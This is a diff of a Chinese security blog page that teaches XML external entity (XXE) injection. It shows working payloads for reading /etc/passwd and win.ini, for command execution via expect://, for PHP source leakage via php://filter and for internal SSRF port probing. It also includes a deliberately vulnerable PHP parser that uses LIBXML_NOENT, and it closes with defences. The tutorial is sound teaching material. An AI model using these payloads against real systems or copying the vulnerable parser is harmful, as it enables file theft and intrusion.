@@ -6,20 +6,21 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
-    <meta name="description" content="XXE漏洞1. XXE概述XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。 可以造成危害  文件读取 ssrf dos 命令执行  XML基础介绍XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。 下面我们主要介绍PHP语言下的XXE攻">
+    <meta name="description" content="XXE漏洞1. XXE概述XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。 可以造成危害  文件读取 ssrf dos 命令执行  XML基础介绍XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。 下面我们主要介绍PHP语言下的XX">
 <meta property="og:type" content="article">
 <meta property="og:title" content="XXE漏洞攻防">
 <meta property="og:url" content="https://godzeo.github.io/2020/03/08/XXE%E6%BC%8F%E6%B4%9E%E6%94%BB%E9%98%B2/index.html">
 <meta property="og:site_name" content="Zeo 安全实验室">
-<meta property="og:description" content="XXE漏洞1. XXE概述XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。 可以造成危害  文件读取 ssrf dos 命令执行  XML基础介绍XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。 下面我们主要介绍PHP语言下的XXE攻">
+<meta property="og:description" content="XXE漏洞1. XXE概述XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。 可以造成危害  文件读取 ssrf dos 命令执行  XML基础介绍XML是可扩展的标记语言（eXtensible Markup Language），设计用来进行数据的传输和存储。 下面我们主要介绍PHP语言下的XX">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200308114723119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200308115546147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="og:image" content="https://img-blog.csdnimg.cn/20200308115659474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70">
 <meta property="article:published_time" content="2020-03-08T08:57:29.000Z">
-<meta property="article:modified_time" content="2020-07-04T09:00:05.434Z">
+<meta property="article:modified_time" content="2020-08-01T08:32:05.517Z">
 <meta property="article:author" content="Zeo">
 <meta property="article:tag" content="WEB安全">
+<meta property="article:tag" content="代码审计">
 <meta property="article:tag" content="内网">
 <meta property="article:tag" content="渗透">
 <meta property="article:tag" content="二进制">
@@ -58,6 +59,8 @@
     
     <!-- rss -->
     
+    
+      <link rel="alternate" href="/true" title="Zeo 安全实验室" type="application/atom+xml" />
     
 <meta name="generator" content="Hexo 4.2.0"></head>
 
@@ -153,7 +156,7 @@
       
     <div class="article-category">
         <i class="fas fa-archive"></i>
-        <a class="category-link" href="/categories/WEB-%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB 漏洞复现和分析</a>
+        <a class="category-link" href="/categories/WEB%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%92%8C%E5%88%86%E6%9E%90/">WEB漏洞复现和分析</a>
     </div>
 
 
@@ -165,6 +168,8 @@
 
   <div class="content" itemprop="articleBody">
     <a id="more"></a>
+
+
 
 <h1 id="XXE漏洞"><a href="#XXE漏洞" class="headerlink" title="XXE漏洞"></a>XXE漏洞</h1><h2 id="1-XXE概述"><a href="#1-XXE概述" class="headerlink" title="1. XXE概述"></a>1. XXE概述</h2><p>XXE（XML External Entity Injection）即XML外部实体注入。漏洞是在对非安全的外部实体数据进行处理时引发的安全问题。</p>
 <p>可以造成危害</p>
@@ -179,8 +184,6 @@
 <h3 id="基本结构"><a href="#基本结构" class="headerlink" title="基本结构"></a>基本结构</h3><p>例子</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--XML声明--&gt;</span></span><br><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span> </span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档类型定义--&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span> [  &lt;!--定义此文档是 note 类型的文档--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">note</span> (<span class="meta-keyword">to</span>,<span class="meta-keyword">from</span>,<span class="meta-keyword">heading</span>,<span class="meta-keyword">body</span>)&gt;</span>  &lt;!--定义note元素有四个元素--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">to</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">from</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">heading</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ELEMENT <span class="meta-keyword">body</span> (<span class="meta-keyword">#PCDATA</span>)&gt;</span>   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span></span><br><span class="line"><span class="meta">]]]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--文档元素--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span>Don't forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
-
 <h3 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h3><p><strong>文档类型定义（DTD）</strong></p>
 <p>可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。</p>
 <ul>
@@ -190,22 +193,14 @@
 <li><p>外部文档声明</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM ”文件名”&gt;</span><br></pre></td></tr></table></figure>
 
-
-
 </li>
 </ul>
 <h4 id="内部声明的例子"><a href="#内部声明的例子" class="headerlink" title="内部声明的例子"></a>内部声明的例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note [</span><br><span class="line">  &lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">  &lt;!ELEMENT to      (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT from    (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">  &lt;!ELEMENT body    (#PCDATA)&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">  &lt;to&gt;KK&lt;&#x2F;to&gt;</span><br><span class="line">  &lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">  &lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">  &lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
 
-
-
 <h4 id="最外部引用的例子"><a href="#最外部引用的例子" class="headerlink" title="最外部引用的例子"></a>最外部引用的例子</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE note SYSTEM &quot;waibu.dtd&quot;&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;KK&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;John&lt;&#x2F;from&gt;</span><br><span class="line">&lt;heading&gt;Reminder&lt;&#x2F;heading&gt;</span><br><span class="line">&lt;body&gt;Don&#39;t forget the meeting!&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure>
-
-
 
 <p>waibu.DTD 被引用的内容为</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT heading (#PCDATA)&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;</span><br></pre></td></tr></table></figure>
-
-
 
 <h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>XXE 即 XML外部实体注入 。</p>
 <p>我们先分别理解一下注入和外部实体的含义。</p>
@@ -216,14 +211,8 @@
 <p>所以<code>XXE</code>就是指<code>XML</code>数据在传输过程中利用外部实体声明部分的<code>“SYSTEM”</code>关键词导致<code>XML</code>解析器可以从本地文件或者远程<code>URI</code>中读取受保护的数据。</p>
 <h2 id="主流的漏洞payload"><a href="#主流的漏洞payload" class="headerlink" title="主流的漏洞payload"></a>主流的漏洞payload</h2><h4 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Quan</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">fff</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hhh</span>&gt;</span><span class="symbol">&amp;fff;</span><span class="tag">&lt;/<span class="name">hhh</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
-
-
-
 <h4 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h4><p>这种情况很少发生，但在配置不当/开发内部应用情况下（PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上），攻击者能够通过XXE执行代码。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line">    <span class="meta">&lt;!DOCTYPE <span class="meta-keyword">Quan</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY f <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"expect://id"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">hhh</span>&gt;</span><span class="symbol">&amp;f;</span><span class="tag">&lt;<span class="name">hhh</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
 
 <h4 id="SSRF内网探测"><a href="#SSRF内网探测" class="headerlink" title="SSRF内网探测"></a>SSRF内网探测</h4><p>我们要根据返回信息内容判断该端口是否打开。</p>
 <p>主要是根据报错信息的差异来判断是否生效</p>
@@ -231,8 +220,10 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">note</span>[</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY <span class="meta-keyword">ssrf</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.246.136:80"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">reset</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">login</span>&gt;</span><span class="symbol">&amp;ssrf;</span><span class="tag">&lt;/<span class="name">login</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">secret</span>&gt;</span>ssrf?<span class="tag">&lt;/<span class="name">secret</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">reset</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="简单的测试代码"><a href="#简单的测试代码" class="headerlink" title="简单的测试代码"></a>简单的测试代码</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  $data = <span class="keyword">isset</span>($_POST[<span class="string">'data'</span>])?trim($_POST[<span class="string">'data'</span>]):<span class="string">''</span>;</span><br><span class="line">  $xml = simplexml_load_string($data,<span class="string">"SimpleXMLElement"</span>,LIBXML_NOENT);</span><br><span class="line">  var_dump($xml)</span><br><span class="line">  <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
 <p>注意：自己写个html提交表单把，我的环境是 win7+phpstudy</p>
 <h3 id="任意文件读取payload"><a href="#任意文件读取payload" class="headerlink" title="任意文件读取payload"></a>任意文件读取payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY content SYSTEM <span class="string">"file:///C:/Windows/win.ini"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
+
 <p><img src="https://img-blog.csdnimg.cn/20200308114723119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="任意文件读取php文件payload"><a href="#任意文件读取php文件payload" class="headerlink" title="任意文件读取php文件payload"></a>任意文件读取php文件payload</h3><p>问题出在读代码地方，都有&lt;&gt;这种可能会把php文件当初xml给处理了，所以直接读取会直接报错。所以我们换一种协议，转化格式读取<br>最终可以导致源码泄露</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY content SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=xxe.php"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
@@ -240,7 +231,6 @@
 <p><img src="https://img-blog.csdnimg.cn/20200308115546147.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>解码后正确<br><img src="https://img-blog.csdnimg.cn/20200308115659474.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2dvZF96elo=,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h3 id="SSRF内网探测payload"><a href="#SSRF内网探测payload" class="headerlink" title="SSRF内网探测payload"></a>SSRF内网探测payload</h3><p>这个报错信息根据环境的不同，协议的不同报错方式都不一样，所以到底这个有没有打开得自行遍历查看异同，和报错信息判断</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY [</span><br><span class="line">	&lt;!ENTITY content SYSTEM <span class="string">"http://127.0.0.1:3306"</span>&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">	&lt;name&gt;&amp;content;&lt;/name&gt;</span><br><span class="line">&lt;/note&gt;</span><br></pre></td></tr></table></figure>
-
 
 <h2 id="防御XXE攻击"><a href="#防御XXE攻击" class="headerlink" title="防御XXE攻击"></a>防御XXE攻击</h2><p>使用开发语言提供的禁用外部实体的方法</p>
 <p>PHP：</p>
